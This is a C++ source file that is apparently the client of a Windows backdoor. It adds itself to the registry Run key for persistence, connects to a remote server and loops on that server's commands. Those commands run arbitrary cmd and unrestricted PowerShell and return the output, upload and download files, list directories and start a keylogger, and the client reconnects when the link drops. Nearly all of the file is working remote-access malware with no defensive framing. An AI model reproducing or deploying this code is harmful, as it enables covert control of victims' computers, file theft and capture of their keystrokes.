//
// Created by avita on 07/08/2020.
//
#include "Connection.h"

Connection::Connection(string ip, unsigned int port) {
    Connection::ip = ip;
    Connection::port = port;


}

int Connection::boot() {
    TCHAR szPath[MAX_PATH];
    DWORD pathLen = 0;
    pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
    cout << szPath << endl;

    if (pathLen == 0) {
        cerr << "Something went wrong" << endl;
        return -1;
    }
    HKEY NewVal;
    if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) !=
        ERROR_SUCCESS) {
        cerr << "Cant open the registry" << endl;
        return -1;
    }


    DWORD pathLenInBytes = pathLen * sizeof(*szPath);
    if (RegSetValueEx(NewVal, TEXT("E"), 0, REG_SZ, (LPBYTE) szPath, pathLenInBytes) != ERROR_SUCCESS) {
        RegCloseKey(NewVal);
        return -1;
    }
    RegCloseKey(NewVal);
    return 0;
}

//Get process name by his pid
string Connection::getProcessName(int pid) {
    HANDLE hProcess = ::OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE,
                                    pid); //Open handle to the process
    //Checking if the handle opened
    if (!hProcess) {
        cerr << "Cant open handle to the process" << endl;
        return CANT_OPEN_HANDLE;
    }
    TCHAR szProcessName[MAX_PATH]; //Buffer of that holds the process name
    GetModuleBaseNameA(hProcess, NULL, szProcessName, sizeof(szProcessName) /
                                                      sizeof(TCHAR)); //Getting the process name and storing it in szProcessName
    CloseHandle(hProcess);
    cout << szProcessName << endl;
    return szProcessName;
}


string Connection::getFocusWindowName() {
    HWND hWindow = ::GetForegroundWindow(); //Get HWND to the focus window
    DWORD pid;
    ::GetWindowThreadProcessId(hWindow, &pid);
    CloseHandle(hWindow);
    return getProcessName(pid);
}


void Connection::sendMessage(const char *data) {
    send(sock, data, strlen(data), 0);
}


void Connection::sendFile(string path) {
    HANDLE hFile = ::CreateFileA(path.c_str(),
                                 GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
                                 FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        //sendMessage("Cant open the file");
        sendMessage(CANT_OPEN_FILE);
        cout << "ERROR " << CANT_OPEN_FILE << " Cant open the file" << endl;
        return;
    }
    sendMessage(FILE_OPENED);
    vector<char> buffer(BUFFER_SIZE + 1, 0);
    DWORD bytesRead = sizeof(DWORD);
    LARGE_INTEGER fileSize;
    int totalReadData = 0;
    ::GetFileSizeEx(hFile, &fileSize);

    //Adding $ to sizeToSend
    string sizeToSend = to_string(fileSize.QuadPart);
    if (sizeToSend.size() < 15) {
        for (int i = sizeToSend.size(); i < 15; i++) {
            sizeToSend += "$";
        }
    }

    send(sock, sizeToSend.c_str(), 15, 0);

    while (bytesRead != 0) {
        ::ReadFile(hFile, buffer.data(), BUFFER_SIZE, &bytesRead, NULL);
        send(sock, buffer.data(), bytesRead, 0);
        totalReadData += bytesRead;
    }
    CloseHandle(hFile);
    cout << "File size is " << fileSize.QuadPart << endl;
    cout << "Total read data is " << totalReadData << endl;
    cout << "Total read data is " << totalReadData << endl;
    char buff[9];
    recv(sock, buff, 9, 0);
    cout << "The final message is " << buff << endl;
}

void Connection::recvFile(string path) {
    vector<char> buffer(BUFFER_SIZE + 1, 0);

    HANDLE hFile = ::CreateFileA(path.c_str(), GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
                                 NULL,
                                 CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        sendMessage(CANT_OPEN_FILE);
        cout << "ERROR " << CANT_OPEN_FILE << " Cant open the file" << endl;
        CloseHandle(hFile);
        return;
    }
    sendMessage(HANDLE_WAS_OPENED);
    int totalFileSize = 0;
    recv(sock, buffer.data(), 15, 0);

    //buffer.data() with $
    string firstString = buffer.data();
    //buffer.data() without $
    string secondString = "";

    //Replacing all the $ at ''
    for (int i = 0; i < firstString.size(); i++) {
        if (firstString[i] == '$')
            break;
        secondString += firstString;
    }

    int fileSize = atoi(secondString.data());
    cout << "File size is " << fileSize << endl;
    cout << "File opened" << endl;


    int size;
    while (totalFileSize != fileSize) {
        size = recv(sock, buffer.data(), BUFFER_SIZE, 0);
        cout << "size is " << size << endl;
        cout << "Data length is " << size << endl;
        totalFileSize += size;
        ::WriteFile(hFile, buffer.data(), size, NULL, NULL);
        cout << totalFileSize << endl;
    }
    CloseHandle(hFile);
    send(sock, FILE_WAS_SENT, 4, 0);
}

string Connection::getAllFiles(string path) {
    string files;
    try {
        for (filesystem::directory_entry file : filesystem::recursive_directory_iterator(path)) {
            files += file.path().string() + "\n";
        }
    } catch (exception &e) {
        return e.what();
    }
    return files;
}

string Connection::runCmdCommand(string &command) {
    char buffer[128];
    std::string result = "";
    FILE *pipe = _popen(command.c_str(), "r");
    if (!pipe) {
        return "There is an error with the command " + command;
    }
    try {
        while (fgets(buffer, sizeof buffer, pipe) != NULL) {
            result += buffer;
        }
    } catch (...) {
        _pclose(pipe);
        return "There is an error with the command " + command;
    }
    _pclose(pipe);
    return result;
}

string Connection::runPowershellCommand(string &command) {
    string commandToRun = "powershell -ExecutionPolicy Unrestricted -Command " +
                          command; // -ExecutionPolicy Unrestricted this means that the powershell ExecutionPolicy will be Unrestricted (permits all scripts to run)
    return runCmdCommand(commandToRun);
}


int Connection::startConnection() {
    WSADATA wsadata;
    WORD ver = MAKEWORD(2, 2);
    int wResult = WSAStartup(ver, &wsadata);

    if (wResult != 0) {
        cerr << "Cant start Winsock" << endl;
        return -1;
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        cerr << "Cant create sock" << WSAGetLastError << endl;
        WSACleanup();
        return -1;
    }
    sockaddr_in hint;
    hint.sin_family = AF_INET;
    hint.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &hint.sin_addr);

    int connectionResult = connect(sock, (sockaddr *) &hint, sizeof(hint));

    if (connectionResult == INVALID_SOCKET) {
        cerr << "Cant connect to server" << WSAGetLastError << endl;
        closesocket(sock);
        WSACleanup();
        return -1;
    }
    return 0;
}


void Connection::connection() {
    startConnection();
    char buf[1024];
    int bytesReceived;
    while (true) {

        cout << "Test" << endl;
        ZeroMemory(buf, 1024);
        bytesReceived = recv(sock, buf, 1024, 0);
        if (bytesReceived == SOCKET_ERROR) {
            cout << "SOCKET_ERROR" << endl;
            cout << WSAGetLastError << endl;
            while (startConnection() != 0);
            continue;
        }

        string command = string(buf, 0, static_cast<const unsigned int>(bytesReceived));
        cout << command << endl;

        if (!command.rfind("cmd")) {
            //Deleting the first 4 (cmd ) characters from the command
            command = command.substr(4, command.size() - 1);
            //Execute the command and saving the output in output
            string output = runCmdCommand(command);

            //Send the results to the server
            //If the command is not returning an output
            if (output.empty()) {
                send(sock, " ", 1, 0);
                continue;
            }
            string size = to_string(output.size());
            if (size.size() < 15) {
                for (int i = size.size(); i < 15; i++) {
                    size += "$";
                }
            }
            //Sending the size of ouput
            send(sock, size.c_str(), 15, 0);
            send(sock, output.c_str(), output.size(), 0);
            cout << output << endl;
            continue;
        } else if (!command.rfind("powershell")) {
            //Removing the powershell from command
            command = command.substr(11, command.size() - 1);
            string output = runPowershellCommand(command);

            //Send the results to the server
            //If the command is not returning an output
            if (output.empty()) {
                send(sock, " ", 1, 0);
                continue;
            }

            string size = to_string(output.size());
            if (size.size() < 15) {
                for (int i = size.size(); i < 15; i++) {
                    size += "$";
                }
            }
            //Sending the size of output
            send(sock, size.c_str(), 15, 0);
            //Sending output
            send(sock, output.c_str(), output.size(), 0);
            cout << output << endl;
            continue;
        }
            //For quitting
        else if (!command.rfind("quit")) {
            cout << "Quitting!" << endl;
            break;
        } else if (!command.rfind("recv file")) { //Sending file to the server
            command = command.substr(10, command.size() - 1);
            sendFile(command);
            continue;
        } else if (!command.rfind("send file")) {
            vector<char> buffer(MAX_PATH + 1, 0);
            cout << "The file code is " << buffer.data() << endl;
            recv(sock, buffer.data(), MAX_PATH, 0); //Where to save the file
            cout << "The file path is " << buffer.data() << endl;
            recvFile(buffer.data());
            continue;
        } else if (!command.rfind("get files")) {
            command = command.substr(10, command.size() - 1);
            string files = getAllFiles(command);
            cout << files << endl;

            //Sending the size of the string with all the files names

            string x = to_string(files.size());

            if (x.size() < 20) {
                for (int i = x.size(); i < 20; i++) {
                    x += "$";
                }
            }
            send(sock, x.c_str(), 20, 0);
            //send(sock, to_string(files.size()).c_str(), 20, 0);
            //sendMessage(to_string(files.size()).c_str());
            cout << files.size() << endl;
            sendMessage(files.c_str());
            continue;
        } else if (!command.rfind("start keylogger")) {
            Keylogger keylogger = Keylogger();
            ::CreateThread(nullptr, 0,
                           reinterpret_cast<LPTHREAD_START_ROUTINE>(keylogger.startKeylogger()),
                           nullptr, 0, nullptr);
            sendMessage("The keylogger has started");
            continue;
        }

        //The command is not exist
        //string cantFind = "The command " + command + " was not found";
        send(sock, COMMAND_NOT_FOUND, 4, 0);
        //sendMessage(cantFind.c_str());
        cout << "The command " << command << " was not found" << endl;

    }


    //The end of the program
    closesocket(sock);
    WSACleanup();
    cout << "End of the program" << endl;
}